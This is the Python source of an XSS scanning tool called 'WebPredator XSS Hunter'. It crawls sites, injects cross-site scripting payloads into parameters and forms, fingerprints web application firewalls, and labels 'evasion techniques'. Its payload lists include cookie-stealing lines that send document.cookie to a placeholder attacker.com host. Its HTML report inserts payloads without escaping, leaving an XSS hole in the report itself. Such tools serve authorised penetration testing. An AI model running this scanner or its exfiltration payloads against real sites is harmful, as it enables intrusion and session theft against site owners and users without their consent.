#!/usr/bin/env python3
"""
WebPredator XSS Hunter - Advanced Cross-Site Scripting Detection
Next-generation XSS detection with intelligent payload generation
"""

import os
import re
import sys
import json
import time
import random
import string
import urllib.parse
import argparse
import itertools
import threading
import concurrent.futures
import logging
import logging.handlers
import hashlib
import platform
import locale
import socket
import ssl
from datetime import datetime

import requests
from tqdm import tqdm

# Optional colored output support
try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    COLOR_OK = Fore.GREEN
    COLOR_WARN = Fore.YELLOW
    COLOR_ERR = Fore.RED
    COLOR_RESET = Style.RESET_ALL
except ImportError:
    COLOR_OK = COLOR_WARN = COLOR_ERR = COLOR_RESET = ''

from collections import OrderedDict
from html.parser import HTMLParser
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

# Global Configuration
VERSION = "1.2.0"
AUTHOR = "Chico Hacker3108"
BANNER = f"""
    __          __  ______                __ 
   / /_  ____  / /_/ ____/___  ____  ____/ /_
  / __ \/ __ \/ __/ /   / __ \/ __ \/ __  __/
 / /_/ / /_/ / /_/ /___/ /_/ / / / / / / /_  
/_.___/\____/\__/\____/\____/_/ /_/\__/\__/  

Advanced XSS Detection Suite v{VERSION}
"""

class SecurityShieldDetector:
    """Advanced security shield detection and analysis"""
    SHIELD_SIGNATURES = {
        'CloudShield': r'cloudshield|cs-protect',
        'DefenseMatrix': r'defensematrix|dm-wall',
        'GuardianX': r'guardianx|gx-firewall',
        'IronGate': r'irongate|ig-protect',
        'Sentinel': r'sentinel-waf',
        'Armorize': r'armorize',
        'WallArm': r'wallarm'
    }
    
    def __init__(self, target_url):
        self.target = target_url
        self.detected_shield = None
        self.evasion_techniques = []
    
    def detect(self):
        """Detect security shields in place"""
        try:
            headers = {
                'User-Agent': self._generate_random_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            req = Request(self.target, headers=headers)
            response = urlopen(req, timeout=15)
            content = response.read().decode('utf-8', 'ignore').lower()
            headers = str(response.headers).lower()

            for shield, pattern in self.SHIELD_SIGNATURES.items():
                if re.search(pattern, headers + content):
                    self.detected_shield = shield
                    self._prepare_evasion_techniques()
                    return shield

            # Check for generic security responses
            security_indicators = [
                'access denied',
                'security violation',
                'request blocked',
                'forbidden'
            ]
            
            if any(indicator in content for indicator in security_indicators):
                self.detected_shield = "Generic Security Shield"
                self._prepare_evasion_techniques()
            
            return self.detected_shield
        
        except Exception as e:
            print(f"[!] Shield detection error: {str(e)}")
            return None
    
    def _prepare_evasion_techniques(self):
        """Prepare appropriate evasion techniques based on shield"""
        if self.detected_shield == "CloudShield":
            self.evasion_techniques = [
                'delay=3-5',
                'header-rotation',
                'chunked-encoding',
                'case-tampering'
            ]
        elif self.detected_shield == "DefenseMatrix":
            self.evasion_techniques = [
                'parameter-pollution',
                'unicode-escape',
                'comment-obfuscation'
            ]
        else:
            self.evasion_techniques = [
                'random-delay',
                'agent-rotation',
                'basic-obfuscation'
            ]
    
    def _generate_random_agent(self):
        """Generate random user agent for requests"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15'
        ]
        return random.choice(agents)

class PayloadGenerator:
    """Advanced XSS payload generation engine"""
    def __init__(self, advanced_mode=False):
        self.advanced = advanced_mode
        self.base_payloads = self._load_base_payloads()
        self.evasion_payloads = self._load_evasion_payloads()
        self.context_aware_payloads = self._load_context_payloads()
    
    def _load_base_payloads(self):
        """Load basic XSS payloads (reflective/stored)"""
        return [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<video><source onerror="javascript:alert(1)">',
            '\"><script>alert(1)</script>',
            '\' onmouseover=alert(1) a=\'',
        ]
    
    def _load_evasion_payloads(self):
        """Load advanced evasion/polyglot payloads"""
        return [
            '<script>/*${"*/alert/*"}*/1/**/</script>',
            '<img/src="x"/onerror=alert(1)>',
            '<svg><script>alert&#40/1/&#41</script>',
            '<math><brute href="javascript:alert(1)">CLICK',
            '<iframe srcdoc="&#60script&#62alert`1`&#60/script&#62">',
            "'><img src=x onerror=alert(1)//",  
            'javascript:window.open(`//attacker.com?c=`+document.cookie)',
            'fetch(`//attacker.com?c=`+document.cookie)',
            'import(`data:text/javascript,alert(document.domain)`)',
            '<object data=javascript:alert(1)>'
        ]
    
    def _load_context_payloads(self):
        """Load context-specific payloads"""
        return {
            'html': self.base_payloads,
            'attribute': [
                '" onmouseover=alert(1) x="',
                "' onfocus=alert(1) x='",
                ' autofocus onfocus=alert(1)//',
                ' onload=alert(1)'
            ],
            'javascript': [
                ';alert(1)//',
                '";alert(1)//',
                "';alert(1)//",
                '`;alert(1)//'
            ],
            'url': [
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>'
            ]
        }
    
    def generate(self, context=None):
        """Generate appropriate payloads based on context"""
        if context and context in self.context_aware_payloads:
            payloads = self.context_aware_payloads[context]
        else:
            payloads = self.base_payloads
        
        if self.advanced:
            payloads.extend(self.evasion_payloads)
        
        return payloads
    
    def generate_fuzz_payloads(self):
        """Generate fuzzing payloads for edge cases"""
        fuzz_vectors = [
            '<>{}$\\/"\'',
            '<<script>alert(1)//<',
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
            '"><img src=x onerror=alert(1)>',
            '"><svg/onload=alert(1)>'
        ]
        
        fuzz_payloads = []
        for vector in fuzz_vectors:
            for i in range(1, 4):  # Generate 1-3 repetitions
                fuzz_payloads.append(vector * i)
        
        return fuzz_payloads

class ResponseAnalyzer(HTMLParser):
    """HTML response analyzer for context detection"""
    def __init__(self):
        super().__init__()
        self.reset()
        self.contexts = {
            'tags': set(),
            'attributes': set(),
            'scripts': [],
            'inputs': []
        }
    
    def handle_starttag(self, tag, attrs):
        self.contexts['tags'].add(tag)
        
        for attr in attrs:
            self.contexts['attributes'].add(attr[0])
            if tag == 'input' and attr[0] == 'name':
                self.contexts['inputs'].append(attr[1])
    
    def handle_data(self, data):
        if 'script' in self.contexts['tags']:
            self.contexts['scripts'].append(data.strip())
    
    def get_contexts(self):
        """Get detected contexts from parsed HTML"""
        return {
            'html_tags': list(self.contexts['tags']),
            'attributes': list(self.contexts['attributes']),
            'scripts': self.contexts['scripts'],
            'input_fields': self.contexts['inputs']
        }

class XSSHunter:
    """Core XSS detection engine"""
    def __init__(self):
        self.config = None
        self.target_url = None
        self.shield_detector = None
        self.payload_generator = None
        self.analyzer = ResponseAnalyzer()
        self.verified_vulns = []
        self.crawled_urls = set()
        self.lock = threading.Lock()
        self.session_headers = {
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
    
    def parse_arguments(self):
        """Parse command line arguments"""
        parser = argparse.ArgumentParser(
            description='WebPredator XSS Hunter - Advanced XSS Detection',
            formatter_class=argparse.ArgumentDefaultsHelpFormatter
        )
        
        input_group = parser.add_argument_group('Input Options')
        input_group.add_argument('-u', '--url', help='Target URL to scan')
        input_group.add_argument('-f', '--file', help='File containing URLs to scan')
        input_group.add_argument('--data', help='POST data for form submission')
        
        scan_group = parser.add_argument_group('Scan Options')
        scan_group.add_argument('-t', '--threads', type=int, default=5,
                                help='Number of concurrent threads')
        scan_group.add_argument('-d', '--delay', type=float, default=0.0,
                                help='Fixed delay between requests (seconds)')
        scan_group.add_argument('-T', '--timeout', type=int, default=15,
                                help='Request timeout (seconds)')
        scan_group.add_argument('--rate-limit', type=float, default=0,
                                help='Max requests per second (0 = unlimited)')
        scan_group.add_argument('--retries', type=int, default=2,
                                help='Number of automatic retries on network failure')
        scan_group.add_argument('--proxy', help='Proxy URL (e.g. http://127.0.0.1:8080)')
        scan_group.add_argument('--insecure-tls', action='store_true',
                                help='Skip TLS certificate verification')
        scan_group.add_argument('-c', '--crawl', action='store_true',
                                help='Crawl the target website')
        scan_group.add_argument('--deep', action='store_true',
                                help='Enable deep scanning mode')
        
        technique_group = parser.add_argument_group('Technique Options')
        technique_group.add_argument('--advanced', action='store_true',
                                     help='Use advanced evasion techniques')
        technique_group.add_argument('--fuzz', action='store_true',
                                     help='Enable payload fuzzing')
        technique_group.add_argument('--skip-shield', action='store_true',
                                     help='Skip security shield detection')
        technique_group.add_argument('--self-update', action='store_true',
                                     help='Update tool to latest version (stub)')
        technique_group.add_argument('--safe', action='store_true',
                                     help='Disable high-risk payloads')
        
        output_group = parser.add_argument_group('Output & Logging')
        output_group.add_argument('-v', '--verbose', action='store_true',
                                  help='Enable verbose output')
        output_group.add_argument('-o', '--output', help='Output file for results')
        output_group.add_argument('--log', choices=['text', 'json'], default='text',
                                  help='Log format')
        output_group.add_argument('--syslog', action='store_true',
                                   help='Send log events to local Syslog')
        output_group.add_argument('--log-file', help='Path to log file')
        output_group.add_argument('--no-progress', action='store_true',
                                   help='Disable progress bars')
        output_group.add_argument('--color', action='store_true',
                                   help='Enable color output')
        
        self.config = parser.parse_args()

        # Initialize components based on parsed args
        self._init_logger()
        self._init_session()
        # Auto threads if 0
        if self.config.threads == 0:
            self.config.threads = (os.cpu_count() or 2) * 2

        if self.config.self_update:
            self._self_update()

        print(BANNER)
        print(f"[*] Running on {platform.system()} {platform.release()} | Locale: {locale.getdefaultlocale()[0]}")
        print(f"[*] Script SHA-256: {self._sha256_self()}")

        if not any([self.config.url, self.config.file]):
            parser.print_help()
            sys.exit(1)
    
    def _init_session(self):
        """Initialize reusable HTTP session with proxy and TLS options"""
        self.session = requests.Session()
        if self.config.proxy:
            self.session.proxies = {
                'http': self.config.proxy,
                'https': self.config.proxy,
            }
        if self.config.insecure_tls:
            self.session.verify = False
            requests.packages.urllib3.disable_warnings(
                requests.packages.urllib3.exceptions.InsecureRequestWarning)

        self._last_request_time = 0.0

    def _request_with_backoff(self, method, url, **kwargs):
        """Send request with retry/backoff logic"""
        attempt = 0
        delay = 1.0
        while attempt <= self.config.retries:
            try:
                if method == 'GET':
                    return self.session.get(url, **kwargs)
                else:
                    return self.session.post(url, **kwargs)
            except requests.RequestException as e:
                attempt += 1
                if attempt > self.config.retries:
                    raise
                time.sleep(delay)
                delay *= 2  # exponential backoff

    def _rate_limit(self):
        if self.config.rate_limit and self.config.rate_limit > 0:
            min_interval = 1.0 / self.config.rate_limit
            delta = time.time() - self._last_request_time
            if delta < min_interval:
                time.sleep(min_interval - delta)
        self._last_request_time = time.time()

    def send_request(self, url, method='GET', data=None):
        """Send HTTP request using requests session with rate limiting"""
        try:
            self._rate_limit()
            headers = self.session_headers.copy()
            headers['User-Agent'] = self._get_random_agent()

            if method.upper() == 'POST':
                resp = self._request_with_backoff('POST', url, data=data, headers=headers,
                                                  timeout=self.config.timeout, allow_redirects=True)
            else:
                resp = self._request_with_backoff('GET', url, headers=headers,
                                                  timeout=self.config.timeout, allow_redirects=True)

            return resp.text
        except requests.RequestException as e:
            if self.config.verbose:
                print(f"[!] Request Error: {e} for {url}")
        except Exception as e:
            if self.config.verbose:
                print(f"[!] Unexpected Error: {e} for {url}")
        return None
    
    def _get_random_agent(self):
        """Get random user agent from predefined list"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
        ]
        return random.choice(agents)

    # --- Logger & Utility Helpers ---
    def _init_logger(self):
        """Configure logger based on CLI settings"""
        self.logger = logging.getLogger('XSSHunter')
        if self.logger.handlers:
            return
        level = logging.DEBUG if self.config.verbose else logging.INFO
        self.logger.setLevel(level)
        if self.config.log == 'json':
            stream_handler = logging.StreamHandler(sys.stdout)
            stream_handler.setFormatter(logging.Formatter('%(message)s'))
        
            def emit_json(record, h=stream_handler):
                payload = {
                    'level': record.levelname,
                    'msg': record.getMessage(),
                    'time': datetime.utcnow().isoformat() + 'Z'
                }
                h.stream.write(json.dumps(payload) + '\n')
            stream_handler.emit = emit_json
            self.logger.addHandler(stream_handler)
        else:
            handler = logging.StreamHandler(sys.stdout)
            handler.setFormatter(logging.Formatter('[%(levelname)s] %(message)s'))
            self.logger.addHandler(handler)
        # Optional file logging
        if getattr(self.config, 'log_file', None):
            fh = logging.FileHandler(self.config.log_file, encoding='utf-8')
            fh.setFormatter(logging.Formatter('[%(levelname)s] %(asctime)s %(message)s'))
            self.logger.addHandler(fh)
        if self.config.syslog:
            try:
                syslog_handler = logging.handlers.SysLogHandler(address='/dev/log')
                syslog_handler.setFormatter(logging.Formatter('%(levelname)s %(message)s'))
                self.logger.addHandler(syslog_handler)
            except Exception:
                pass

    def _sha256_self(self):
        """Return first 16 chars of SHA-256 of current file"""
        h = hashlib.sha256()
        with open(__file__, 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''):
                h.update(chunk)
        return h.hexdigest()[:16]

    def _self_update(self):
        self.logger.info('Self-update not yet implemented — stay tuned!')

    def analyze_page(self, url):
        """Analyze page content for injection contexts and DOM-based sinks"""
        response = self.send_request(url)
        if not response:
            return None

        # Check CSP header strength
        csp = self.session.headers.get('Content-Security-Policy') if hasattr(self.session, 'headers') else None
        weak_csp = not csp or 'script-src' not in csp or "'unsafe-inline'" in csp
        if weak_csp and self.config.verbose:
            print('[!] Weak or missing CSP detected')

        self.analyzer = ResponseAnalyzer()
        self.analyzer.feed(response)
        contexts = self.analyzer.get_contexts()

        # Simple DOM-XSS sink detection
        dom_sinks = re.findall(r'(innerHTML|outerHTML|document\.write|eval\(|setTimeout\()', response)
        if dom_sinks:
            self.verified_vulns.append({
                'url': url,
                'parameter': 'DOM',
                'payload': ','.join(set(dom_sinks)),
                'method': 'DOM'
            })
            if self.config.verbose:
                print(f'[+] Potential DOM XSS sinks found on {url}: {", ".join(set(dom_sinks))}')
        return contexts
    
    def test_payload(self, url, param, payload, method='GET'):
        """Test specific payload against parameter"""
        test_url = self._inject_payload(url, param, payload, method)
        
        if method.upper() == 'GET':
            response = self.send_request(test_url)
        else:
            # Handle POST requests
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            params.update(urllib.parse.parse_qs(self.config.data)) if self.config.data else None
            params[param] = payload
            response = self.send_request(url, method='POST', data=params)
        
        if response and payload in response:
            with self.lock:
                if test_url not in self.verified_vulns:
                    self.verified_vulns.append({
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'method': method
                    })
                    print(f"[+] XSS Found: {test_url}")
                    print(f"    Parameter: {param}")
                    print(f"    Payload: {payload[:60] + '...' if len(payload) > 60 else payload}")
                    return True
        
        return False
    
    def _inject_payload(self, url, param, payload, method='GET'):
        """Inject payload into target URL"""
        if method.upper() == 'POST':
            return url  # POST data handled separately
        
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        
        if param in query:
            query[param] = [payload]
        else:
            # Handle path parameters
            path = parsed.path
            if '{' in path and '}' in path:
                path = path.replace('{' + param + '}', payload)
            
            new_parsed = parsed._replace(path=path)
            return urllib.parse.urlunparse(new_parsed)
        
        new_query = urllib.parse.urlencode(query, doseq=True)
        new_parsed = parsed._replace(query=new_query)
        return urllib.parse.urlunparse(new_parsed)
    
    def crawl_website(self, base_url):
        """Crawl website to discover additional endpoints"""
        if base_url in self.crawled_urls:
            return
        
        self.crawled_urls.add(base_url)
        print(f"[*] Crawling: {base_url}")
        
        response = self.send_request(base_url)
        if not response:
            return
        
        # Extract links
        links = set(re.findall(r'href=[\'"]?([^\'" >]+)', response))
        
        for link in links:
            if link.startswith('http'):
                if self.target_url in link and link not in self.crawled_urls:
                    self.crawl_website(link)
            elif link.startswith('/'):
                full_url = urllib.parse.urljoin(base_url, link)
                if full_url not in self.crawled_urls:
                    self.crawl_website(full_url)
        
        # Extract forms
        forms = re.findall(r'<form.*?</form>', response, re.DOTALL)
        for form in forms:
            self._process_form(base_url, form)
    
    def _process_form(self, base_url, form_html):
        """Process HTML forms for testing"""
        action = re.search(r'action=[\'"]?([^\'" >]+)', form_html)
        method = re.search(r'method=[\'"]?([^\'" >]+)', form_html, re.I)
        
        form_url = action.group(1) if action else base_url
        form_method = method.group(1).upper() if method else 'GET'
        
        if not form_url.startswith('http'):
            form_url = urllib.parse.urljoin(base_url, form_url)
        
        inputs = re.findall(r'<input.*?>', form_html, re.DOTALL)
        params = {}
        
        for input_tag in inputs:
            name = re.search(r'name=[\'"]?([^\'" >]+)', input_tag)
            if name:
                params[name.group(1)] = 'test'
        
        if params:
            self.test_parameters(form_url, params, form_method)
    
    def test_parameters(self, url, params=None, method='GET'):
        """Test all parameters on a given URL"""
        if url in self.crawled_urls and not self.config.deep:
            return
        
        print(f"[*] Testing: {url}")
        
        if not params:
            parsed = urllib.parse.urlparse(url)
            params = {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
        
        page_context = self.analyze_page(url)
        payloads = self.payload_generator.generate()
        if self.config.safe:
            payloads = [p for p in payloads if 'script>' not in p.lower() and 'iframe' not in p.lower()]
        
        if self.config.fuzz:
            payloads.extend(self.payload_generator.generate_fuzz_payloads())
        
        # Prepare task list for concurrent execution
        tasks = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            total_jobs = len(params) * len(payloads)
            progress = tqdm(total=total_jobs, disable=(self.config.no_progress or not self.config.verbose), desc="Testing")

            for param in params.keys():
                for payload in payloads:
                    tasks.append(executor.submit(self.test_payload, url, param, payload, method))

            for future in concurrent.futures.as_completed(tasks):
                progress.update(1)
            progress.close()

        if self.config.delay > 0:
            time.sleep(self.config.delay)
    
    def run_scan(self):
        """Execute the complete scanning process"""
        print(BANNER)
        self.parse_arguments()
        
        # Initialize components
        self.payload_generator = PayloadGenerator(self.config.advanced)
        
        if not self.config.skip_shield and self.config.url:
            self.shield_detector = SecurityShieldDetector(self.config.url)
            shield = self.shield_detector.detect()
            if shield:
                print(f"[!] Security Shield Detected: {shield}")
                print(f"[*] Applying Evasion: {', '.join(self.shield_detector.evasion_techniques)}")
        
        # Process input targets
        if self.config.file:
            with open(self.config.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
            
            for target in targets:
                self.target_url = target
                if self.config.crawl:
                    self.crawl_website(target)
                else:
                    self.test_parameters(target)
        
        elif self.config.url:
            self.target_url = self.config.url
            if self.config.crawl:
                self.crawl_website(self.config.url)
            else:
                method = 'POST' if self.config.data else 'GET'
                params = urllib.parse.parse_qs(self.config.data) if self.config.data else None
                self.test_parameters(self.config.url, params, method)
        
        # Generate report
        self._generate_report()
        print("\n[+] Scan completed!")
    
    def _generate_report(self):
        """Generate scan report"""
        if not self.verified_vulns:
            print("[-] No XSS vulnerabilities found")
            return
        
        print("\n[+] Vulnerabilities Found:")
        for vuln in self.verified_vulns:
            print(f"\nURL: {vuln['url']}")
            print(f"Method: {vuln['method']}")
            print(f"Parameter: {vuln['parameter']}")
            print(f"Payload: {vuln['payload']}")
        
        if self.config.output:
            if self.config.output.lower().endswith('.html'):
                html_rows = "".join([
                    f"<tr><td>{v['url']}</td><td>{v['method']}</td><td>{v['parameter']}</td><td><code>{v['payload']}</code></td></tr>"
                    for v in self.verified_vulns
                ])
                html_content = f"""
<!DOCTYPE html>
<html lang='en'>
<head>
<meta charset='utf-8'>
<title>XSS Scan Report</title>
<style>
 body {{ font-family: Arial, sans-serif; }}
 table {{ border-collapse: collapse; width: 100%; }}
 th, td {{ border: 1px solid #ccc; padding: 8px; }}
 th {{ background: #333; color: #fff; }}
 tr:nth-child(even) {{ background: #f2f2f2; }}
 code {{ color: #d14; }}
</style>
</head><body>
<h2>WebPredator XSS Report</h2>
<table>
<tr><th>URL</th><th>Method</th><th>Parameter</th><th>Payload</th></tr>
{html_rows}
</table>
<p>Generated on {datetime.utcnow().isoformat()}Z</p>
</body></html>
"""
                with open(self.config.output, 'w', encoding='utf-8') as f:
                    f.write(html_content)
            else:
                with open(self.config.output, 'w', encoding='utf-8') as f:
                    json.dump(self.verified_vulns, f, indent=2)
            print(f"\n[+] Report saved to {self.config.output}")

if __name__ == '__main__':
    try:
        scanner = XSSHunter()
        scanner.run_scan()
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        scanner._generate_report()
        sys.exit(1)
    except Exception as e:
        print(f"[-] Critical Error: {str(e)}")
        sys.exit(1)